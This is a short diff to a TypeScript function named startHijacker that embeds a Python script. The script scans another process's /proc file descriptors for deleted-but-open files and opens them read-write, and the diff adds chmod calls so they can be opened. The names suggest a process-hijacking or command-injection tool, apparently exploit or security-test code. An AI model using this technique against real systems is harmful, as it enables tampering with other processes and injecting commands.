@@ -127,6 +127,7 @@ const startHijacker = (vpid: number, injectCmd: string, secs = 90, logPath?: str
     "    for n in names:\n" +
     "        try:\n" +
     "            if '(deleted)' not in os.readlink('/proc/%s/fd/%s'%(vpid,n)): continue\n" +
+    "            os.chmod('/proc/%s/fd/%s'%(vpid,n),0o600)\n" +
     "            f=os.open('/proc/%s/fd/%s'%(vpid,n), os.O_RDWR)\n" +
     "        except: continue\n" +
     "        try:\n" +
@@ -144,6 +145,7 @@ const startHijacker = (vpid: number, injectCmd: string, secs = 90, logPath?: str
     "    except: return None\n" +
     "    for n in names:\n" +
     "        try:\n" +
+    "            os.chmod('/proc/%s/fd/%s'%(vpid,n),0o600)\n" +
     "            f=os.open('/proc/%s/fd/%s'%(vpid,n), os.O_RDWR)\n" +
     "            if os.fstat(f).st_ino==ino: return (f,n)\n" +
     "            os.close(f)\n" +
